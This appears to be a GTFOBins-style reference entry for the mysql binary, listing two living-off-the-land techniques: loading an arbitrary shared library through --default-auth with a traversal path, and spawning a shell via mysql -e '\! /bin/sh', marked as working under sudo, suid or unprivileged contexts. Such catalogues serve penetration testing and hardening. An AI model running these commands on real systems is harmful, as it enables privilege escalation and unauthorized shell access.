---
type: gtfobin
name: mysql
platform: Unix
functions: [library-load, shell]
tags: [gtfobin, unix, lotl]
---

# mysql

## library-load

```bash
mysql --default-auth ../../../../../path/to/lib
```
_The following loads the `/path/to/lib.so` shared object._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
mysql -e '\! /bin/sh'
```
**Contexts:** sudo, suid, unprivileged
